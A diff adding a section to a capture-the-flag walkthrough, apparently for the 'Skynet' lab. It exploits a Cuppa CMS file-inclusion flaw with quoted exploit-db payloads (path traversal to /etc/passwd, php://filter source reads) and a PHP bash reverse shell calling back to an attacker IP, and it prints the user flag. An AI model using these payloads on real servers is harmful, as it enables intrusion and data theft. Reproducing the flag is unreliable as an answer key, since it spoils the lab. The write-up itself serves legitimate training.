@@ -254,3 +254,86 @@ containing:
 2. Work on T-800 Model 101 blueprints
 3. Spend more time with my wife
 Answer: /45kra24zxs28v3yd is the hidden directory
+
+## Q3 What is the vulnerability called when you can include a remote file for malicious purposes?
+Answer: Remote File Inclusion
+
+This is literally a clue for the next step, gobuster search into directory finds a directory called /administrator. A quick search with browser shows THM_Target/administrator/ presents us with the Cuppa CMS login page, based on text above login section "Use a valid username and password to gain access to the administrator". Clearly meant to be an administrative access point. 
+
+## Q4 What is the user flag?
+
+Now to exploit the Cuppa CMS page which easiest option is via searchsploit, which presents same information on exploit as exploit-db.com
+
+searchsploit gives us:
+```
+$ searchsploit cuppa                
+...
+ Exploit Title                                                  |  Path
+------------------------------------------------------------------------------------------
+Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion | php/webapps/25971.txt
+------------------------------------------------------------------------------------------
+
+$ cat /usr/share/exploitdb/exploits/php/webapps/25971.txt
+# Exploit Title   : Cuppa CMS File Inclusion
+...
+# Tested on       : Window and Linux
+...
+####################################
+VULNERABILITY: PHP CODE INJECTION
+####################################
+/alerts/alertConfigField.php (LINE: 22)
+-----------------------------------------------------------------------------
+LINE 22:   <?php include($_REQUEST["urlConfig"]); ?>
+-----------------------------------------------------------------------------
+#####################################################
+DESCRIPTION
+#####################################################
+
+An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.
+
+http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]
+
+#####################################################
+EXPLOIT
+#####################################################
+
+http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
+http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+
+Moreover, We could access Configuration.php source code via PHPStream
+
+For Example:
+-----------------------------------------------------------------------------
+http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
+-----------------------------------------------------------------------------
+...
+```
+The path listed target/cuppa/alerts/... I checked gobuster or dictionary and then added cuppa. There is no cuppa name in the directory structure but alerts is present. so I tried:
+http://THM_Target/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+
+This successfully downloads the full passwd file, changing passwd to shadows blank page indicating not at root user access privilege.
+
+For remote file inclusion we can upload a reverse shell, using a PHP file. for a PHP file to be executable and to run a bash script inside:
+<?php
+exec("/bin/bash -c 'command1; command2; command3'");
+?>
+using a simple reverse shell:
+```
+<?php exec ("/bin/bash -c 'bash -i >& /dev/tcp/<AttackBoxIP>/443 0>&1'");?>
+```
+Then uploading using a simple python http server and calling the script by changing urlconfig line:
+urlConfig=http://<AttackBoxIP>443/shell.php
+
+A reverse shell is connected and flag is obtained:
+
+```
+www-data@skynet:/var/www/html/45kra24zxs28v3yd/administrator/alerts$ cd /home/milesdyson
+www-data@skynet:/home/milesdyson$ ls
+backups
+mail
+share
+user.txt
+www-data@skynet:/home/milesdyson$ cat user.txt
+7ce5c2109a40f958099283600a9ae807
+```
+##
